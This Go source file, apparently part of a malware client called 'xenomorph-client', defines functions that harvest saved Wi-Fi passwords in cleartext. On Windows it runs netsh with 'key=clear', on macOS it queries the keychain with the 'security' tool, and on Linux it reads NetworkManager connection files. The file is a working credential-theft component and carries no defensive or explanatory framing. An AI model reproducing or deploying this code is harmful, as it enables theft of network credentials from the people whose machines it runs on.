package network

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os/exec"
	"regexp"
	"strings"

	"github.com/codevault-llc/xenomorph-client/pkg/utils"
)

func GetWiFiPasswordWindows(ssid string) (string, error) {
	cmd := exec.Command("netsh", "wlan", "show", "profile", fmt.Sprintf("name=%q", ssid), "key=clear")
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return "", err
	}

	re := regexp.MustCompile(`Key Content\s*:\s*(.*)`)
	matches := re.FindStringSubmatch(out.String())
	if len(matches) > 1 {
		return strings.TrimSpace(matches[1]), nil
	}

	return "", fmt.Errorf("password not found for SSID: %s", ssid)
}

func GetWiFiPasswordMac(ssid string) (string, error) {
	cmd := exec.Command("security", "find-generic-password", "-D", "AirPort network password", "-a", ssid, "-w")
	out, err := cmd.Output()
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(out)), nil
}

func GetWiFiPasswordLinux(ssid string) (string, error) {
	path := fmt.Sprintf("/etc/NetworkManager/system-connections/%s.nmconnection", ssid)
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return "", err
	}

	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		if strings.HasPrefix(line, "psk=") {
			return strings.TrimPrefix(line, "psk="), nil
		}
	}

	return "", fmt.Errorf("password not found in config for SSID: %s", ssid)
}

func GetWiFiPassword(ssid string) (string, error) {
	switch {
	case utils.IsWindows():
		return GetWiFiPasswordWindows(ssid)
	case utils.IsMacOS():
		return GetWiFiPasswordMac(ssid)
	case utils.IsLinux():
		return GetWiFiPasswordLinux(ssid)
	default:
		return "", fmt.Errorf("unsupported operating system")
	}
}